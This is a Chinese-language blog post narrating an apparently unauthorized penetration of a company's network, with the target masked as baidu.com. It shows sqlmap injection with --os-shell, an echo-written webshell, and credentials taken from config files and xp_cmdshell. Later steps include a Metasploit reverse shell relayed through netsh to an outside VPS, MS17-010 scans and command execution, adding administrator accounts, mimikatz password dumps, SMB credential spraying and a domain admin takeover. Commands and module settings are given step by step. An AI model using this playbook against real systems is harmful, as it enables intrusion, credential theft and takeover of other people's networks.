<!DOCTYPE html><html class="appearance-auto" lang="cn"><head><meta charset="UTF-8"><title>浅记一次水逼的内网渗透</title><meta name="description" content="J0o1ey Blog | Hack for Sec and Good"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="0x00 外网入口点打开站点（这里用baidu.com替代）看了看，左翻翻右翻翻能看到很明显的“注入”点。简单测试一下（and 1&amp;#x3D;1、1&amp;#x3D;2），返回不一样，所以sqlmap一把梭。Thread 10开十个线程，跑的能快点
sqlmap -u https://baidu.com/detail.asp?Prod=2222222222 --random-agent  --thread 10


估计外国站和带宽的原因，跑的很慢。所以走了一遍正常的信息收集:
真实ip:8.8.8.8
Web容器:Microsoft-IIS/7.5
子域名：
mailserver.baidu.com
mail.baidu.com
端口：80、443
......

发现页面登录处admin有个万能密码，登录进去.."><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">J0o1ey's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">浅记一次水逼的内网渗透</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%A4%96%E7%BD%91%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-text">0x00 外网入口点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%B8%AD%E8%BD%AC%E6%8D%A3%E9%BC%93"><span class="toc-text">0x01 中转捣鼓</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%83%8A%E7%8E%B0%E6%9D%80%E8%BD%AF"><span class="toc-text">0x02 惊现杀软</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-msf%E5%A4%A7%E6%9D%80%E5%9B%9B%E6%96%B9"><span class="toc-text">0x03 msf大杀四方</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><i class="tag post-item-tag">内网渗透</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">浅记一次水逼的内网渗透</h1><time class="has-text-grey" datetime="2019-08-08T08:02:52.000Z">2019-08-08</time><article class="mt-2 post-content"><h2 id="0x00-外网入口点"><a href="#0x00-外网入口点" class="headerlink" title="0x00 外网入口点"></a>0x00 外网入口点</h2><p>打开站点（这里用baidu.com替代）看了看，左翻翻右翻翻能看到很明显的“注入”点。简单测试一下（and 1&#x3D;1、1&#x3D;2），返回不一样，所以sqlmap一把梭。<br>Thread 10开十个线程，跑的能快点</p>
<pre><code>sqlmap -u https://baidu.com/detail.asp?Prod=2222222222 --random-agent  --thread 10
</code></pre>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7t7Px"><img src="https://s2.ax1x.com/2019/08/08/e7t7Px.png" alt="e7t7Px.png"></a></p>
<p>估计外国站和带宽的原因，跑的很慢。所以走了一遍正常的信息收集:</p>
<pre><code>真实ip:8.8.8.8
Web容器:Microsoft-IIS/7.5
子域名：
mailserver.baidu.com
mail.baidu.com
端口：80、443
......
</code></pre>
<p>发现页面登录处admin有个万能密码，登录进去发现只有查看账单的一些功能，所以没用。<br>C段发现用同一套模板的站，判断是属同一家，所以也注入点跑了一遍。发现这个站跑的比目标站快很多，所以先搞。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7tqxO"><img src="https://s2.ax1x.com/2019/08/08/e7tqxO.png" alt="e7tqxO.png"></a></p>
<p>–is-dba为dba权限，故os–shell试试，权限system<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7tbRK"><img src="https://s2.ax1x.com/2019/08/08/e7tbRK.png" alt="e7tbRK.png"></a></p>
<p>两个站都是08系统+sql注入+dba权限+system权限，直接拿到权限一条龙。外网入口点太轻松，可忽略，抱着学内网的心态。都一样的站，所以搞目标站。</p>
<h2 id="0x01-中转捣鼓"><a href="#0x01-中转捣鼓" class="headerlink" title="0x01 中转捣鼓"></a>0x01 中转捣鼓</h2><p>执行回显得很慢，加了threads 10也是很慢。想着上cs和msf，死活不上线，怀疑有杀软或者拦截协议或者其他。<br>ceye试一下 ping xxxxxxx.ceye.io<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7toI1"><img src="https://s2.ax1x.com/2019/08/08/e7toI1.png" alt="e7toI1.png"></a></p>
<p>平台有记录，能通外网。但是bitsadmin等下载命令都试了，不上线。走echo写马路线。<br>先找到web的目录，目录在C盘根目录？<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7tHG6"><img src="https://s2.ax1x.com/2019/08/08/e7tHG6.png" alt="e7tHG6.png"></a><br>写了n次马子，愣是没上去，位置不对还是有查杀小马的玩意？嗯，位置不对（猜可能有其他盘，d盘bingo）和好像还有个杀马子的玩意（用了个大小写换下，^是转义字符）。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7tOMD"><img src="https://s2.ax1x.com/2019/08/08/e7tOMD.png" alt="e7tOMD.png"></a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7N9it"><img src="https://s2.ax1x.com/2019/08/08/e7N9it.png" alt="e7N9it.png"></a></p>
<h2 id="0x02-惊现杀软"><a href="#0x02-惊现杀软" class="headerlink" title="0x02 惊现杀软"></a>0x02 惊现杀软</h2><p>查看进程，之前发现有进程有ekrn.exe，egui.exe（eset的进程），不会免杀的我浪死在沙滩上。之前在刀上能执行命令的，这次回去补图居然执行不了命令了。sqlmap那个执行回显太慢，找张内网机子的图补一下（它内网机子都装了eset）。</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7tjqH"><img src="https://s2.ax1x.com/2019/08/08/e7tjqH.png" alt="e7tjqH.png"></a></p>
<p>翻翻文件（无脑子的翻，不确定哪些重要哪些不重要，感觉都重要），看看有什么数据库密码什么的。找到一些配置文件，发现数据库密码、邮服密码？。（在某个文件夹里面发现同行的脚本，应该没被日穿吧。）</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7tXse"><img src="https://s2.ax1x.com/2019/08/08/e7tXse.png" alt="e7tXse.png"></a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7txZd"><img src="https://s2.ax1x.com/2019/08/08/e7txZd.png" alt="e7txZd.png"></a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7Niz8"><img src="https://s2.ax1x.com/2019/08/08/e7Niz8.png" alt="e7Niz8.png"></a></p>
<p>先留着这些账号密码，存着之后可以考虑进入内网开始爆破操作。</p>
<h2 id="0x03-msf大杀四方"><a href="#0x03-msf大杀四方" class="headerlink" title="0x03 msf大杀四方"></a>0x03 msf大杀四方</h2><p>  直接用之前获取到的Sqlserver的sa账号密码，xp_cmdshell执行命令<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NSII"><img src="https://s2.ax1x.com/2019/08/08/e7NSII.png" alt="e7NSII.png"></a></p>
<p>Msf监听接收到shell，然后开启内网转发进入内网。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7Neds"><img src="https://s2.ax1x.com/2019/08/08/e7Neds.png" alt="e7Neds.png"></a><br>run autoroute –s 网段<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NELQ"><img src="https://s2.ax1x.com/2019/08/08/e7NELQ.png" alt="e7NELQ.png"></a><br>MS17-010安排上，秒杀内网开始</p>
<pre><code>Use auxiliary/scanner/smb/smb_ms17_010
Set rhosts 网段ip
Set threads 线程
run
</code></pre>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NCJP"><img src="https://s2.ax1x.com/2019/08/08/e7NCJP.png" alt="e7NCJP.png"></a></p>
<p>这很泰国ms17-010基本都没打补丁。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NkQS"><img src="https://s2.ax1x.com/2019/08/08/e7NkQS.png" alt="e7NkQS.png"></a></p>
<p>搜集了一下信息，发现199ip很可能是个域控，存在大量用户（199不出网，不通外网）。<br>因为杀软问题直接利用ms17-010反弹shell是无法成功的，这里我们使用ms17-010命令执行的exp。</p>
<pre><code>Use auxiliary/admin/smb/ms17_010_command
Set command 执行的命令
Set rhosts  目标
Run
</code></pre>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7Nuiq"><img src="https://s2.ax1x.com/2019/08/08/e7Nuiq.png" alt="e7Nuiq.png"></a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7Nmon"><img src="https://s2.ax1x.com/2019/08/08/e7Nmon.png" alt="e7Nmon.png"></a><br>Ok执行成功，添加用户和管理组<br>然后regeorg配和proxifier用之前的外网口子进入内网（regeorg通过web脚本文件将内网流量转发出来，具体可百度学习）</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NAsg"><img src="https://s2.ax1x.com/2019/08/08/e7NAsg.png" alt="e7NAsg.png"></a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NZZj"><img src="https://s2.ax1x.com/2019/08/08/e7NZZj.png" alt="e7NZZj.png"></a></p>
<p>然后远程到199ip的桌面，下面让199ip主机反弹shell到msf。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NyeH"><img src="https://s2.ax1x.com/2019/08/08/e7NyeH.png" alt="e7NyeH.png"></a><br>我们已经拿到6的权限，可以使用微软自带的netsh转发进行中转shell。<br>我们这里设置的是将访问ip 10.1.1.6  8081端口的流量全部转发到外网vps 4478端口<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NKJ0"><img src="https://s2.ax1x.com/2019/08/08/e7NKJ0.png" alt="e7NKJ0.png"></a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NrOe"><img src="https://s2.ax1x.com/2019/08/08/e7NrOe.png" alt="e7NrOe.png"></a></p>
<p>199这个IP直接反弹shell到6的8081端口。（6会通过netsh设置转发到公网VPS上）。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NQzT"><img src="https://s2.ax1x.com/2019/08/08/e7NQzT.png" alt="e7NQzT.png"></a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7N1QU"><img src="https://s2.ax1x.com/2019/08/08/e7N1QU.png" alt="e7N1QU.png"></a><br>199这个主机也没什么东西读波密码溜。（读密码需要system权限我们使用ms17-010进行提权）</p>
<p>通过ms17提权成功，读密码。</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7N3yF"><img src="https://s2.ax1x.com/2019/08/08/e7N3yF.png" alt="e7N3yF.png"></a><br>Load mimikatz 加载mimikatz<br>Kerberos   读取明文<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7N8L4"><img src="https://s2.ax1x.com/2019/08/08/e7N8L4.png" alt="e7N8L4.png"></a></p>
<p>我们拿到了199的明文密码。（下面我们利用此密码进行撞C段主机）。</p>
<pre><code>Use auxiliary/scanner/smb/smb_login
Set rhosts IP
Set smbuser 用户名
Set smbpass 密码
Set threads 线程
Run
</code></pre>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NYw9"><img src="https://s2.ax1x.com/2019/08/08/e7NYw9.png" alt="e7NYw9.png"></a></p>
<p>撞出了大量主机<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NtoR"><img src="https://s2.ax1x.com/2019/08/08/e7NtoR.png" alt="e7NtoR.png"></a><br>此时行总发来了电报说他腰疼，七夕节腰疼有点意思。<br>通过行总发来的文档，得知内网存在5个C段，每个段都存在域控？？</p>
<p>前边已经得知10ip主机存在ms17（通外网，直接添加管理员用户）。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7N0SK"><img src="https://s2.ax1x.com/2019/08/08/e7N0SK.png" alt="e7N0SK.png"></a></p>
<p>然后在进行IPC进行连接。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NUF1"><img src="https://s2.ax1x.com/2019/08/08/e7NUF1.png" alt="e7NUF1.png"></a><br>然后把马copy到目标C盘。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NaJx"><img src="https://s2.ax1x.com/2019/08/08/e7NaJx.png" alt="e7NaJx.png"></a><br>使用ms17进行执行木马反弹shell。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NdW6"><img src="https://s2.ax1x.com/2019/08/08/e7NdW6.png" alt="e7NdW6.png"></a><br>读取密码进行远程桌面连接。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NDyD"><img src="https://s2.ax1x.com/2019/08/08/e7NDyD.png" alt="e7NDyD.png"></a><br>Run getgui –e 开启远程桌面。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NBQO"><img src="https://s2.ax1x.com/2019/08/08/e7NBQO.png" alt="e7NBQO.png"></a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NcTA"><img src="https://s2.ax1x.com/2019/08/08/e7NcTA.png" alt="e7NcTA.png"></a><br>域内没有一台主机卧槽？域不要钱一样的搭建。（我们把目标转向1 IP主机 貌似还挺多域内主机 1的域为ESOURCE）。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NRYt"><img src="https://s2.ax1x.com/2019/08/08/e7NRYt.png" alt="e7NRYt.png"></a><br>1 IP主机没有可利用系统漏洞，目标转向域内用户，碰碰运气看能不能读到域管理密码。（先攻击存在ms17的域内主机）<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7N2FI"><img src="https://s2.ax1x.com/2019/08/08/e7N2FI.png" alt="e7N2FI.png"></a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NTmQ"><img src="https://s2.ax1x.com/2019/08/08/e7NTmQ.png" alt="e7NTmQ.png"></a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7N7wj"><img src="https://s2.ax1x.com/2019/08/08/e7N7wj.png" alt="e7N7wj.png"></a></p>
<p>基本套路ms17添加用户IPC上传文件ms17执行木马。（不要问我为啥不直接弹shell，因为杀软拦截，为啥拦截？我不知道！）</p>
<p>读了两台域内主机的密码，都没有读到域用户密码。（连个域普通用户都没有，拿到一个普通用户还能搞个黄金票据）。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NWfP"><img src="https://s2.ax1x.com/2019/08/08/e7NWfP.png" alt="e7NWfP.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NhSf"><img src="https://s2.ax1x.com/2019/08/08/e7NhSf.png" alt="e7NhSf.png"></a></p>
<p>最后目标锁定在79 IP上 hash碰撞发现：他的本地管理员密码和199 IP主机本地管理员密码相同。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7N4l8"><img src="https://s2.ax1x.com/2019/08/08/e7N4l8.png" alt="e7N4l8.png"></a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7N56S"><img src="https://s2.ax1x.com/2019/08/08/e7N56S.png" alt="e7N56S.png"></a><br>最后成功读到一枚域管理密码，deng登陆进去<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NHTs"><img src="https://s2.ax1x.com/2019/08/08/e7NHTs.png" alt="e7NHTs.png"></a></p>
<p>这特码是域环境？这特码是工作组吧。。。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/e7NOf0"><img src="https://s2.ax1x.com/2019/08/08/e7NOf0.png" alt="e7NOf0.png"></a></p>
<p>头疼死了，其他段的域控不想搞了，本次内网渗透就此结束。</p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2019/09/13/%E5%BE%AE%E8%BD%AF%E4%B8%8D%E5%BD%93%E6%B4%9E%E7%9A%84%E6%BC%8F%E6%B4%9E-Windows%E6%8F%90%E6%9D%83%E7%A5%9E%E5%99%A8JuicyPotato/" title="微软不当洞的漏洞-Windows提权神器JuicyPotato"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: 微软不当洞的漏洞-Windows提权神器JuicyPotato</span></a><a class="button is-default" href="/2019/06/26/%E6%B5%85%E8%AE%B0Badusb%E7%AA%83%E5%8F%96%E5%87%AD%E6%8D%AE%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%B6%E4%BD%9C%E8%BF%87%E7%A8%8B/" title="浅记Badusb窃取凭据的详细制作过程"><span class="has-text-weight-semibold">Next: 浅记Badusb窃取凭据的详细制作过程</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="j0o1ey/j0o1ey.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/j0o1ey"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> J0o1ey 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>